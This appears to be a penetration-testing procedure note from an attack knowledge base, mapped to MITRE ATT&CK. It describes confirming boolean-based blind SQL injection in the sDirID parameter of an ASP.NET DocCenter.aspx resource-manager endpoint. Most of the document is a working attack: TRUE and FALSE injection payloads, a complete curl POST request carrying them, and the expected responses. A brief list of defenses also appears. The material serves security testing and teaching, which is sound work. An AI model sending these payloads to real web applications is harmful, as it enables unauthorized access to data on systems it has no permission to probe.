---
tags:
  - sqli
  - blind-sqli
  - boolean-based
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/post-sqli-boolean-payload-initial]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.109Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: dc51a007-2205-4c01-914f-f6193cb7c436
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Test-Boolean-Based-SQL-Injection-Payloads

## Summary

This procedure crafts mathematical expression-based payloads for blind boolean SQL injection, testing TRUE and FALSE conditions to confirm the vulnerability without causing syntax errors or direct data output.

## Description

Boolean-based blind SQLi exploits differences in application behavior for true/false conditions. Payloads like '-1 OR 3*2*1=6 AND 000159=000159' (TRUE, always returns data) versus '-1 OR 3*2=5 AND 000159=000159' (FALSE, returns no data) are injected into sDirID. The application's response (e.g., full vs. empty directory list) indicates success. This method is stealthy as it avoids error-based leaks.

## Requirements

1. Captured legitimate request from prior step
2. Proxy tool for iterative testing
3. Understanding of SQL boolean logic

## Defense

Defensive measures and detection strategies:

- Input validation to reject mathematical operators in parameters
- Query logging to detect conditional OR clauses
- Rate limiting on resource manager endpoints

## Objectives

1. Validate injection point with non-disruptive payloads
2. Differentiate true/false responses
3. Prepare for exploitation payloads

## Instructions

### Step 1: Construct TRUE Payload

**Context**: Replace sDirID with a always-true condition to observe expanded response.

**Command** ([[commands/post-sqli-boolean-payload-initial]]):
```bash
curl -X POST https://target/DocCenter.aspx \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "EVENTTARGET=ResourceManager1&EVENTARGUMENT=-|public|GetDirs&VIEWSTATE=...&EVENTVALIDATION=...&submitDirectEventConfig={\"config\":{\"extraParams\":{\"sDirID\":\"-1 OR 3*2*1=6 AND 000159=000159\"}}}" \
  -b "ASP.NET_SessionId=..."
```

> Expected output: Response with all directories or unauthorized data, indicating TRUE evaluation.

### Step 2: Test FALSE Payload

**Context**: Use a false condition to confirm behavioral difference.

**Instructions**: Modify payload to '-1 OR 3*2=5 AND 000159=000159' and resend. Compare to TRUE response.

**Expected Output**: Empty or limited response, no errors.

**Success Indicators**:
- TRUE: Broader data return
- FALSE: Restricted or no data

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/post-sqli-boolean-payload-initial]]

## Tools Used


## Tags

- [[sqli]]
- [[blind-sqli]]
